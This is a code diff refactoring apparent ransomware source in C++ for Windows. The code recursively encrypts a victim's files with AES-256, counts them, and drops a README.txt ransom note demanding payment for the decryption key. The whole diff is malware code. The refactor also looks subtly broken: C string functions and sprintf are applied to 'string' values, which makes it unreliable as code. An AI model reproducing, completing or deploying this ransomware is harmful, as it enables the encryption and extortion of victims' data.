@@ -9,20 +9,19 @@
 
 #include <fileapi.h>
 
-bool isEncryptedFile(char* file) {
+bool isEncryptedFile(string file) {
   char* ext = strrchr(file, '.');
   if (ext == NULL) return false;
-  ext++;
-  return strcmp(ext, "encrypted") == 0;
+  return strcmp(ext + 1, "encrypted") == 0;
 }
 
-bool isValidFile(char* file) {
+bool isValidFile(string file) {
   char* ext = strrchr(file, '.');
   if (ext == NULL) return false;
   ext++;
   bool res = false;
   for (int i = 0; i < (int)sizeof(extensions) - 1 && !res; i++)
-    res = strcmp(ext, extensions[i]) == 0;
+    res = strlen(ext) == strlen(extensions[i]) && strcmp(ext, extensions[i]) == 0;
   return res;
 }
 
@@ -30,7 +29,7 @@ bool isValidFile(char* file) {
   To encrypt files using AES 256, the file size must be a multiple of 16 bytes
   This function adds 1 to 16 bytes to the file using ANSI X9.23 padding method
 */
-void ANSI_X9_23(char* filename) {
+void ANSI_X9_23(string filename) {
   FILE* file = fopen(filename, "rb+");
   fseek(file, 0, SEEK_END);
   uint32_t size = ftell(file);
@@ -64,7 +63,7 @@ void Encrypter::destroyKey() {
   key = NULL;
 }
 
-void Encrypter::AES_stream_encrypt(char* filename) {
+void Encrypter::AES_stream_encrypt(string filename) {
   AES_ctx ctx = AES_init_ctx(this->key);
   FILE* file = fopen(filename, "rb+");
   fseek(file, 0, SEEK_END);
@@ -87,7 +86,7 @@ void Encrypter::AES_stream_encrypt(char* filename) {
   delete[] dest;
 }
 
-void Encrypter::AES_stream_decrypt(char* filename) {
+void Encrypter::AES_stream_decrypt(string filename) {
   AES_ctx ctx = AES_init_ctx(this->key);
   FILE* file = fopen(filename, "rb+");
   fseek(file, 0, SEEK_END);
@@ -116,14 +115,14 @@ void Encrypter::AES_stream_decrypt(char* filename) {
   remove(filename);
 }
 
-void Encrypter::encryptFile(char* fname) {
+void Encrypter::encryptFile(string fname) {
   if (!isValidFile(fname)) return;
-  cant_encrypted++;
   ANSI_X9_23(fname);
-  this->AES_stream_encrypt(fname);
+  AES_stream_encrypt(fname);
+  cant_encrypted++;
 }
 
-void Encrypter::decryptFile(char* fname) {
+void Encrypter::decryptFile(string fname) {
   if (!isEncryptedFile(fname)) return;
   AES_stream_decrypt(fname);
   cant_decrypted++;
@@ -133,12 +132,12 @@ void Encrypter::generateKey() {
   key = advandedRNG(id, len, time(NULL) ^ clock());
 }
 
-void Encrypter::notify(const char* sPath) {
+void Encrypter::notify(string sPath) {
   char path[512];
   sprintf(path, "%s\\%s", sPath, "README.txt");
   FILE* idfile = fopen(path, "w");
 
-  const char* buffer = "After payment, use the next id to generate your key: ";
+  string buffer = "After payment, use the next id to generate your key: ";
   fwrite(buffer, sizeof(char), strlen(buffer), idfile);
   fwrite(id, sizeof(uint8_t), len, idfile);
   buffer = "\nYou can also use it to decrypt one file for free!\n";
@@ -147,49 +146,37 @@ void Encrypter::notify(const char* sPath) {
   fclose(idfile);
 }
 
-void Encrypter::encrypt(const char* sDir) {
+void Encrypter::recursive(option opt, string path) {
   char sPath[512];
-  sprintf(sPath, "%s\\*.*", sDir); // Search all files
+  sprintf(sPath, "%s\\*.*", path); // Search all files
   WIN32_FIND_DATA fdFile;
   HANDLE hFind = FindFirstFile(sPath, &fdFile);
   do {
     if (strcmp(fdFile.cFileName, ".") != 0 && strcmp(fdFile.cFileName, "..") != 0) {
-      sprintf(sPath, "%s\\%s", sDir, fdFile.cFileName);
+      sprintf(sPath, "%s\\%s", path, fdFile.cFileName);
       if (fdFile.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
-        this->encrypt(sPath); // Folder
-      else
-        this->encryptFile(sPath); // File
+        this->recursive(opt, sPath); // Folder
+      else {
+        if (opt == ENCRYPT)
+          encryptFile(sPath); // File
+        else
+          decryptFile(sPath);
+      }
     }
   } while (FindNextFile(hFind, &fdFile)); // Find the next file
   FindClose(hFind); // Clean
-  this->notify(sDir);
+  if (opt == ENCRYPT)
+    notify(path);
 }
 
-void Encrypter::decrypt(const char* sDir, uint8_t* decrypt_key) {
-  if (key == NULL)
-    key = decrypt_key;
-  char sPath[512];
-  sprintf(sPath, "%s\\*.*", sDir); // Search all files
-  WIN32_FIND_DATA fdFile;
-  HANDLE hFind = FindFirstFile(sPath, &fdFile);
-  do {
-    if (strcmp(fdFile.cFileName, ".") != 0 && strcmp(fdFile.cFileName, "..") != 0) {
-      // Build up file path
-      sprintf(sPath, "%s\\%s", sDir, fdFile.cFileName);
-      // Is it a file or folder?
-      if (fdFile.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
-        this->decrypt(sPath, decrypt_key); // Recursion
-      else
-        this->decryptFile(sPath);
-    }
-  } while (FindNextFile(hFind, &fdFile)); // Find the next file
-  FindClose(hFind); // Clean
+void Encrypter::setKey(uint8_t* decrypt_key) {
+  key = decrypt_key;
 }
 
-unsigned int Encrypter::getCantEncrypted() {
+uint Encrypter::getCantEncrypted() {
   return cant_encrypted;
 }
 
-unsigned int Encrypter::getCantDecrypted() {
+uint Encrypter::getCantDecrypted() {
   return cant_decrypted;
 }
